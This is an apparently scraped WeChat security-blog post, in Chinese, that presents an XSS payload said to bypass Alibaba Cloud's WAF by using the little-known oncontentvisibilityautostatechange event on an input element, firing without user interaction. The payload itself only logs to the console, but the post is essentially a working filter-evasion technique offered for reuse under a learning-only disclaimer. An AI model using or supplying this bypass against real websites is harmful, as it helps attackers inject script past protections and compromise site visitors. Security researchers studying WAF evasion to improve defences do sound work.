---
title: xss利用冷门事件绕过阿里云waf
url: https://mp.weixin.qq.com/s/Rk5UNtjDruDVGV5q_3GiMA
source: Doonsec's feed
date: 2026-06-25
fetch_date: 2026-06-26T06:07:27.898890
---

# xss利用冷门事件绕过阿里云waf

![cover_image](https://mmbiz.qpic.cn/mmbiz_jpg/dPpNgze7tx24AMl3ic92uHAR5hBr0uYxbSxOibJic7F7qiaPtZOp8cG9vNY11ibOP9f6bfup02QgKGJ8fayic9jxWhszUqibR7zIpJ6sasfjvrbhr8/0?wx_fmt=jpeg)

# xss利用冷门事件绕过阿里云waf

原创

十二
十二

起凡安全

![]()

在小说阅读器读本章

去阅读

![]()

在小说阅读器中沉浸阅读

**免责声明**

本文中所涉及的技术、思路仅为学习交流，由于传播、利用本公众号所提供的信息而造成的任何直接或者间接的后果及损失，均由使用者本人负责，一旦造成后果请自行承担！

在其他地方看到的一条payload，可以用来绕过阿里云waf，正常测试被拦截

![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/dPpNgze7tx1B5qvSAibZupDaTrQutnXTBiakVOHvpd6lIOd82mEgufr5vrRPQrCB7Xx6XVLSnZTkGhm5AUibZKibyyNf5gOyEC5fJqdAIkxeSjk/640?wx_fmt=jpeg)

payload如下

```
<input style=content-visibility:auto oncontentvisibilityautostatechange="console.log('xss')">
```

无需用户交互即可触发

![](https://mmbiz.qpic.cn/sz_mmbiz_png/dPpNgze7tx2ePhLicEL92HQ5QFEg5Xib1yBnAKZ0bhpPibkNeIGEA4wn4DfWlUVg1E78V7S03RlyVFG4unlzrRQWa2oeHZKWCWAGsQOpHhqV68/640?wx_fmt=png&from=appmsg)

预览时标签不可点

![]()

微信扫一扫
关注该公众号

知道了

![]()
微信扫一扫
使用小程序

取消
允许

取消
允许

取消
允许

×
分析

![跳转二维码]()

![作者头像](http://mmbiz.qpic.cn/sz_mmbiz_png/CgXd9Hbb64libpj6fbFN9sLicsFuKPbldibngUI4haIkqPlsiblMGv6jg1SoPJbs4Izal9VRQMT8rhlxicsUTfwJnibA/0?wx_fmt=png)

微信扫一扫可打开此内容，
使用完整服务

：
，
，
，
，
，
，
，
，
，
，
，
，
。

视频
小程序
赞
，轻点两下取消赞
在看
，轻点两下取消在看
分享
留言
收藏
听过